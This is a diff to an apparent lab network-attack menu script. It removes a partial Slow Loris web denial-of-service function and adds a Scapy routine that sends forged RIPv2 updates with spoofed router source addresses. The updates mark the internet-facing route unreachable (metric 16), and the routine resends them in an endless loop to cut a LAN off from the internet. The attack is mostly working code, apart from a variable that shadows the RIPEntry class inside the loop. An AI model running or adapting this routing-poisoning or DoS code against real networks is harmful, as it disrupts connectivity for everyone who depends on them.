@@ -212,21 +212,34 @@ def spoofed_udp_flood():
 def icmp_reverse_shell():
     return 0
 
-def slow_loris():
-    #implement slow loris attack
-    
-    print("Insert WebServer IP address: ")
-    target = input()
-    print("Attacking " + str(target) + " with slow loris attack.")
+def RIP_attack():
 
+    address = "192.168.220.0" #hop to Firewall and thus to Internet
+    
+    target_1 = "192.168.220.30" # target 1 -> R5 can be reached by R1 via R2
+    target_2 = "192.168.220.40" # target 2 -> R5 can be reached by R1 via R4
+	
+    target_list = [target_1, target_2]
+
+    packet_list = []
+    for target in target_list:
+	
+	#define headers
+        IP_header = IP(src=target, dst="224.0.0.9", ttl=1) #multicast address for RIPv2
+        UDP_header = UDP(sport=520, dport=520)
+        RIP_header = RIP(cmd=2, version=2)
+        RIPEntry = RIPEntry(addr=address, mask="255.255.255.0", metric=16)
+	
+        #define the packet
+        packet = IP_header / UDP_header / RIP_header / RIPEntry
+	
+	#append to list to be sent
+        packet_list.append(packet)
+    
+    #loop the sending
     while True:
-        socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socket.connect((target, 80))
-        #check if connection is established
-        print("Connection established with " + str(target))
-        socket.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-        socket.send("User-Agent: {}\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-        socket.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+        for packet in packet_list:
+            send(packet, inter=0.0005)
 
 def choose_recon():
     #clear the screen
@@ -326,14 +339,14 @@ def choose_exploit():
     print("\n")
     print("Choose an exploit.")
     print("1. ICMP Reverse Shell")
-    print("2. Slow Loris")
+    print("2. RIP Attack on the LAN access to the Internet")
     print("3. Exit")
     print("----------------------------------------------")
     choice = input("Enter your choice: ")
     if choice == "1":
         icmp_reverse_shell()
     elif choice == "2":
-        slow_loris()
+        RIP_attack()
     elif choice == "3":
         print("Back to main menu.")
         os.system("clear")
